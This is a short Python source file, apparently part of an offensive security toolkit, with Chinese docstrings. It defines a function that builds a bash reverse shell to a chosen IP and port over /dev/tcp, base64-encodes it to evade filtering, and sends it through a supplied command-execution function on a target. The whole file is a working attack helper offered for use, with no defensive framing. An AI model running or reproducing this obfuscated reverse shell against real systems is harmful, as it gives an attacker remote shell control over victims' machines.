# coding: utf-8
'''
Created on 2020年5月22日

@author: raytine
'''
import base64


def base64_bash_reverse_shell(self, ip, port, exec_cmd_function):
    """
    .反弹shell
    para:
        ip:
            type:str
            describe:反弹shell接收ip
        port:
            type:str
            describe:反弹shell接收端口
        exec_cmd_function:
            type:function
            describe:发送shell指令的函数
    return:
        None
    exception:
        None
    """
    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"
    cmd = "bash -i >& /dev/tcp/{ip}/{port} 0>&1".format(ip=ip, port=port)
    cmd = base64.b64encode(cmd.encode()).decode()
    shell = shell.replace('SHELL', cmd)
    html = exec_cmd_function(shell)
    return html